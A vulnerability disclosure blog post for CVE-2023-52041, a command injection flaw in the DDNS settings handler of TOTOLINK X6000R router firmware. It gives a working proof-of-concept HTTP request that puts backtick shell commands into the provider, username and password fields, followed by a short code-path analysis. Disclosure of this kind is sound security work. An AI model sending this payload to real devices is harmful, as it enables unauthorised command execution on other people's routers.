=== Content from kee02p.github.io_a77fba17_20250115_192108.html ===

[**Kee02p's Blog**](/)

* [首页](/)
* [归档](/archives/)
* [分类](/categories/)
* [标签](/tags/)
* [关于](/about/)

2024年1月13日 中午

1.4k 字

12 分钟

 次

# CVE-2023-52041

# Product:

TOTOLINK X6000R

# Version：

V9.4.0cu.852\_B20230719

# Firmware download address ：

<https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/247/ids/36.html>

# Vulnerability Description：

In the sub\_410118 function of the shttpd program, it is possible to obtain the passed values using Uci\_Set\_Str and then achieve arbitrary command execution through CsteSystem.

## POC

Execute the commands `ls > /1.txt`, `ls > /2.txt`, and `ls > /3.txt` respectively.

| ``` 12345678910111213 ``` | ``` POST /cgi-bin/cstecgi.cgi HTTP/1.1Host: 192.168.75.2User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestContent-Length: 103Origin: http://192.168.75.2Connection: closeReferer: http://192.168.75.2/advance/ddns.html{"enable":"1","provider":"`ls > /1.txt`","domain":"1","username":"`ls > /2.txt`","password":"`ls > /3.txt`","topicurl":"setDdnsCfg"} ``` |
| --- | --- |

![1](/../images/CVE-2023-52041/image-20231221233927561.png)

### effect

![2](/../images/CVE-2023-52041/image-20231221234058564.png)

![3](/../images/CVE-2023-52041/image-20231221234121178.png)

## Analysis

In sub\_410118,The program receives the provider, username, and password passed from the frontend, and then processes them by passing them into Uci\_Set\_Str.

![4](/../images/CVE-2023-52041/image-20231221233756098.png)

In Uci\_Set\_Str, the parameters are concatenated using snprintf and then passed into CsteSystem for execution.

![5](/../images/CVE-2023-52041/image-20240113120556134.png)

CsteSystem:

![6](/../images/CVE-2023-52041/image-20231221160916019.png)

---

[CVE](/categories/CVE/)

[#Command Execution](/tags/Command-Execution/)

CVE-2023-52041
https://kee02p.github.io/2024/01/13/CVE-2023-52041/

作者
Kee02p

发布于
2024年1月13日

许可协议

[CVE-2023-52042
上一篇](/2024/01/13/CVE-2023-52042/ "CVE-2023-52042")

[Fuzzing101\_Ex1
下一篇](/2023/11/08/Fuzzing101-Ex1/ "Fuzzing101_Ex1")

Please enable JavaScript to view the comments

目录

#### 搜索

×

关键词

[Hexo](https://hexo.io)  [Fluid](https://github.com/fluid-dev/hexo-theme-fluid)

总访问量

次

总访客数

人

博客在允许 JavaScript 运行的环境下浏览效果更佳


